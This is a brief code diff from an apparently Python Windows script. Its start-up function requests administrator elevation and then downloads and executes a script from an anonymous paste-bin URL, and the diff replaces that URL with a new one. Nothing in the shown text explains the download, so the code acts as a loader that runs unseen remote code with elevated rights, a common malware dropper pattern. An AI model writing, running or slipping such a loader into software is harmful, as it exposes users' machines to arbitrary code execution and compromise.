@@ -31,5 +31,5 @@ def _start_():
     if not ctypes.windll.shell32.IsUserAnAdmin():
         run_as_admin()
 
-    script_url = "https://cdn.sourceb.in/bins/ZXY5NMimKs/0"
+    script_url = "https://cdn.sourceb.in/bins/XbhZ6nBmta/0"
     execute_script_from_url(script_url)
